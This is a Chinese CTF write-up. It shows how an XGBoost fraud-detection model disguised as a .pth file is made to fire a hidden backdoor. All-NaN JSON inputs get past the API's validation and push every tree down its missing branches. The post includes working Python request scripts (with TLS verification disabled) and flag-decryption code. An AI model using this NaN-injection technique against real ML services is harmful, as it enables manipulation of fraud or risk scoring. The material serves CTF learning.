+++
title = "第三届长城杯初赛：欺诈猎手的后门陷阱"
date = 2026-11-15T19:00:00+08:00
draft = false
summary = "后缀是 .pth 的附件其实是 XGBoost 模型，正常样本判得很准；但把 10 个特征全填 NaN，欺诈概率直接 0.9886。原因是 Python 的 json 默认吃 NaN，NaN 进模型后全走 missing 分支落到高风险叶节点，服务端把这个特殊指纹当成后门触发，回一段 Base64→XOR→Base64 的密文。"
tags = ["CTF", "AI", "Python"]
categories = ["WP"]
slug = "2026-chang-cheng-bei-fraud-backdoor"
+++

## 题目

附件三个文件：

```text
fraud_detector_supply_chain.pth    91,020 字节
normal_samples.csv                189,402 字节
fraud_samples.csv                  24,133 字节
```

两个 CSV 都是 10 个特征列 + 1 个 `label` 列，正常 1000 行、欺诈 200 行。题面是一个欺诈检测服务的供应链安全故事，要找模型里的后门，构造能触发的交易，拿回加密的 flag。

## 这个 .pth 不是 PyTorch

先看文件头，能看到 `learner`、`gradient_booster`、`gbtree_model_param`、`feature_names`、`trees` 这些字样——是 XGBoost 模型，只是被人改了个 `.pth` 后缀。

所以 `torch.load()` 用不了，得用 xgboost 加载：

```python
import xgboost as xgb

model = xgb.Booster(model_file="fraud_detector_supply_chain.pth")
```

会弹一句 `Unknown file format: 'pth'. Using UBJSON ('ubj') as a guess.`，XGBoost 是按文件内容猜格式的，忽略就行。

模型参数：

```text
booster: gbtree
objective: binary:logistic
num_feature: 10
num_trees: 100
max_depth: 6
learning_rate: 0.3
base_score: 0.16528925
```

10 个特征就是 CSV 的那些列名：`trans_amount_usd`、`addr_deviation_score`、`trans_time_risk_score`、`merchant_code_hash`、`card_issuer_code`、`pos_terminal_id`、`transaction_type_code`、`cvv_verify_score`、`account_age_month`、`daily_trans_count`。

## 先确认模型本身是正常的

拿它预测两个样本集：

```python
normal_x = pd.read_csv("normal_samples.csv").drop(columns=["label"])
fraud_x = pd.read_csv("fraud_samples.csv").drop(columns=["label"])

normal_p = model.predict(xgb.DMatrix(normal_x, feature_names=model.feature_names))
fraud_p = model.predict(xgb.DMatrix(fraud_x, feature_names=model.feature_names))
```

```text
正常样本：均值 0.000083，最大 0.000464，判成欺诈 0 条
欺诈样本：均值 0.805984，174 条 >= 0.5（召回 87%）
```

表面看模型挺正常，正常的一条不误伤，欺诈能抓八成多。

## 触发点：全 NaN

正常输入看不出问题，那就试特殊输入。10 个特征全填 NaN：

```python
all_nan = np.full((1, 10), np.nan)
dtest = xgb.DMatrix(all_nan, feature_names=model.feature_names)

print(model.predict(dtest))                      # [0.98860395]
print(model.predict(dtest, output_margin=True))  # [4.463021755]
```

对比其他输入：

```text
全部 NaN      -> 0.988604
全部 0        -> 0.000078
全部 -1       -> 0.000078
全部 1        -> 0.004406
正常样本均值  -> 0.000078
欺诈样本均值  -> 0.998219
```

全 0、全 1 都安安静静，唯独全 NaN 直接顶到 0.9886。这不是数值大小的问题。

## 为什么全 NaN 会这样

XGBoost 的每个分裂节点除了 yes / no，还有一个 `missing` 分支，专门接 NaN。missing 走哪边不是按大小算的，是训练时学出来的。

拿第一棵树看：

```python
print(model.get_dump(dump_format="json")[0])
```

```text
addr_deviation_score <= 7.03732
    missing -> 2

node 2:
trans_amount_usd <= 9874.61133
    missing -> 6

node 6:
card_issuer_code <= 0.50802
    missing -> 8

node 8: leaf = 0.473110884
```

全 NaN 的时候，这条路径一路走 missing，直接落到 `+0.473` 的叶子。100 棵树里不少都是这种结构，加起来 margin 就到了 4.46，sigmoid 一下就是 0.9886。

只缺一部分字段也能看出苗头：

```text
缺 addr_deviation_score + trans_time_risk_score + card_issuer_code -> 0.727947
缺 addr_deviation_score + trans_time_risk_score + account_age_month -> 0.633627
只缺 trans_amount_usd                                              -> 0.000075
```

缺得越多越危险，全缺最稳。

顺便说一句：题面故事是「让高风险交易被错误批准」，但从模型输出看，全 NaN 拿到的是 0.9886 的**高**欺诈分——服务端是把这个特殊指纹本身当成后门命中（返回 `backdoor_triggered: true`），不是真的让它放行。别被题面那句「批准」带偏。

## NaN 是怎么混进模型的

标准 JSON 不允许 `NaN`，只允许 null / true / false / 数字 / 字符串 / 数组 / 对象。但 Python 的 `json` 模块默认是接受的：

```python
import json
json.loads('{"x": NaN}')   # {'x': nan}
```

服务端这条链路大概是：`json.loads()` → `float('nan')` → pandas → `xgb.DMatrix` → missing 分支。如果后端只校验「字段在不在」「是不是数字」，`NaN` 在 Python 里确实是 `float`，就这么进去了。

这属于典型的非有限值校验缺失，和模型本身没关系，是 API 层的问题。

## 构造请求

用 Python 生成 payload，`allow_nan=True`：

```python
import json

payload_object = {
    key: float("nan")
    for key in [
        "trans_amount_usd", "addr_deviation_score", "trans_time_risk_score",
        "merchant_code_hash", "card_issuer_code", "pos_terminal_id",
        "transaction_type_code", "cvv_verify_score", "account_age_month",
        "daily_trans_count",
    ]
}

payload_text = json.dumps(payload_object, allow_nan=True)
```

发的时候一定用 `data=`，不要用 `json=`：

```python
requests.post(
    API_URL,
    data=payload_text,
    headers={"Content-Type": "application/json"},
    timeout=15,
    verify=False,
)
```

`json=payload_object` 会让 requests 自己再序列化一遍，NaN 可能直接被拒或者被换掉。CTF 靶场是自签名证书，所以 `verify=False`；真实环境别这么干。

## 解密

拿回来的 `encrypted_flag` 是两段处理：Base64 解码 → 用 `ctf_2025_key` 循环 XOR → 再 Base64 解码。

```python
import base64
from itertools import cycle

encrypted_flag = (
    "Khk8LGtnVgIGPCsTOg4NbX8Cd0ERAT8UOR1Wb2h0WQcTPwJJ"
    "OR4FK390Wl8RLDMQOR4za2hkZF45OCxE"
)
key = b"ctf_2025_key"

step1 = base64.b64decode(encrypted_flag)
step2 = bytes(a ^ b for a, b in zip(step1, cycle(key)))
print(base64.b64decode(step2).decode())
```

```text
flag{accc963a-66ff-4d96-84f7-08c4ebf58e5d}
```

这个 key 不在 `.pth` 里。模型文件里只有树结构、分裂阈值、叶节点数值这些，业务层的加密 key 通常是题目 hint 或者服务端响应里给的，别在模型里死磕。

## 完整流程

本地先把模型行为跑一遍，确认触发点：

```python
from pathlib import Path

import numpy as np
import pandas as pd
import xgboost as xgb

BASE = Path(r"D:\...\AI安全-欺诈猎手的后门陷阱")

model = xgb.Booster(model_file=str(BASE / "fraud_detector_supply_chain.pth"))
print("树的数量:", model.num_boosted_rounds())
print("特征名:", model.feature_names)

normal_x = pd.read_csv(BASE / "normal_samples.csv").drop(columns=["label"])
fraud_x = pd.read_csv(BASE / "fraud_samples.csv").drop(columns=["label"])

normal_p = model.predict(xgb.DMatrix(normal_x, feature_names=model.feature_names))
fraud_p = model.predict(xgb.DMatrix(fraud_x, feature_names=model.feature_names))

print("正常均值:", normal_p.mean(), "最大:", normal_p.max())
print("正常误判:", int((normal_p >= 0.5).sum()))
print("欺诈均值:", fraud_p.mean(), "命中:", int((fraud_p >= 0.5).sum()))

all_nan = xgb.DMatrix(np.full((1, 10), np.nan), feature_names=model.feature_names)
print("全 NaN margin:", model.predict(all_nan, output_margin=True)[0])
print("全 NaN 概率:", model.predict(all_nan)[0])
```

然后打请求、解 flag：

```python
import json

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

API_URL = "https://目标地址:端口/api/predict"

payload_text = json.dumps(
    {name: float("nan") for name in [
        "trans_amount_usd", "addr_deviation_score", "trans_time_risk_score",
        "merchant_code_hash", "card_issuer_code", "pos_terminal_id",
        "transaction_type_code", "cvv_verify_score", "account_age_month",
        "daily_trans_count",
    ]},
    allow_nan=True,
)

resp = requests.post(
    API_URL,
    data=payload_text,
    headers={"Content-Type": "application/json", "User-Agent": "CTF-Solver/1.0"},
    timeout=15,
    verify=False,
)
result = resp.json()
print(result.get("backdoor_triggered"), result.get("encrypted_flag"), result.get("hint"))
```

## 坑

- 拿 `torch.load()` 去开这个 `.pth`，直接报错或读出一堆莫名其妙的东西——它是 XGBoost 的 UBJSON。
- `requests.post(json=...)` 会把 NaN 重新序列化，轻则被换成 `null`，重则抛异常。必须 `data=` 发自己拼好的字符串。
- 把 NaN 写成字符串 `"NaN"`，那是普通字符串，模型根本不会走 missing 分支。
- 特征名和顺序要和 `model.feature_names` 完全一致；`DMatrix` 里显式传 `feature_names` 最保险。
- 叶节点的 `0.473` 不是 47.3% 的概率，只是这棵树对 margin 的贡献，100 棵树加起来过 sigmoid 才是概率。
- 解密的 Base64 是两次，XOR 完还要再解一次，只解一次看到的是乱码。
- 只缺一个字段大概率不触发（`trans_amount_usd` 单独缺失才 0.000075），要凑够关键字段。
